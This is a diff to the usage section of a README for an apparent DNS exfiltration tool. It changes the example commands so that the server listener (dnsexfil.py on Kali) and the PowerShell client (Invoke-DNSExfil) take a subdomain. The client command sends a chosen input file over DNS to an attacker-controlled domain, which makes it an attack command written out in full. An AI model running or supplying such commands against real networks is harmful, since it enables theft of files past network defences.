@@ -47,9 +47,9 @@ Usage
 
 ***SERVER SIDE***
 
-Start the `dnsexfil.py` script passing it the domain name and decryption password to be used:
+Start the `dnsexfil.py` script passing it the domain name or subdomain and decryption password to be used:
 ```
-root@kali:~# ./dnsexfil.py -d mydomain.com -p password
+root@kali:~# ./dnsexfil.py -d subdomain.mydomain.com -p password
 ```
 
 ***CLIENT SIDE***
@@ -76,7 +76,7 @@ DNSExfil.exe <file> <domainName> <password> [-b32] [h=google|cloudflare] [s=<DNS
 ```
 c:\DNSExfil> powershell
 PS c:\DNSExfil> Import-Module .\dnsexfil.ps1
-PS c:\DNSExfil> Invoke-DNSExfil -i inputFile -d mydomain.com -p password -s my.dns.server.com -t 500
+PS c:\DNSExfil> Invoke-DNSExfil -i inputFile -d subdomain.mydomain.com -p password -s my.dns.server.com -t 500
 [...]
 ```
 # Other examples
